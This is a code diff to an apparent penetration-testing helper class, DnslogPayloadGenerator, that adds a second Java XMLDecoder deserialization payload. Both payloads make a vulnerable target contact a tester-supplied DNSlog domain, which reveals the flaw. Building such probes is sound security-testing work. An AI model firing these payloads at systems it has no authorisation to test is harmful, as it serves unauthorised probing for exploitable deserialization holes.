@@ -27,6 +27,7 @@ public class DnslogPayloadGenerator implements IHelper {
 
     public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
         String dnslog_domain = (String)customArgs.get("dnslog_domain");
+        resultOutput.successPrintln("Payload1:");
         String payload = String.format("<java>\n" +
                 "    <new class=\"java.net.URL\">\n" +
                 "        <string>http://%s</string>\n" +
@@ -34,6 +35,18 @@ public class DnslogPayloadGenerator implements IHelper {
                 "    </new>\n" +
                 "</java>",dnslog_domain);
 
+        resultOutput.rawPrintln("\n" + payload + "\n");
+        resultOutput.successPrintln("Payload2:");
+        payload = String.format("<java>\n" +
+                "    <new class=\"java.util.HashMap\">\n" +
+                "        <void method=\"put\">\n" +
+                "            <new class=\"java.net.URL\">\n" +
+                "                <string>http://%s</string>\n" +
+                "            </new>\n" +
+                "            <string>x</string>\n" +
+                "        </void>\n" +
+                "    </new>\n" +
+                "</java>",dnslog_domain);
         resultOutput.rawPrintln("\n" + payload + "\n");
     }
 }
